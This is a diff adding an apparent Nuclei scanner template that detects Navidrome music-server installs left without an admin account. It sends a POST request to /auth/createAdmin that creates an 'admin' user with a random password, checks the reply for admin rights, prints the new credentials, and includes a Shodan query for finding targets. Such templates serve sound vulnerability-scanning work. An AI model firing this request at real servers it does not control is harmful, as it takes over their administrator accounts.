@@ -1,0 +1,45 @@
+id: navidrome-admin-install
+
+info:
+  name: Navidrome Admin User Creation
+  author: DhiyaneshDK
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"content="Navidrome""
+  tags: navidrome,installer,misconfig,intrusive,vuln
+
+variables:
+  username: "admin"
+  password: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |
+        POST /auth/createAdmin HTTP/1.1
+        Host: {{Hostname}}
+        content-type: application/json
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/app/
+
+
+        {"username":"admin","password":"{{password}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"isAdmin":true'
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"USER: "+ username'
+          - '"PASS: "+ password'
+# digest: 4b0a00483046022100eb18133f407aca98652744622639f4a164cf25fcd0e5d39228483e34bbd1acf2022100ffdebecd0667016b43a2ec309d03055ffda6ad6c1d61b1cc8d8115a5d42708cd:922c64590222798bb761d5b6d8e72950
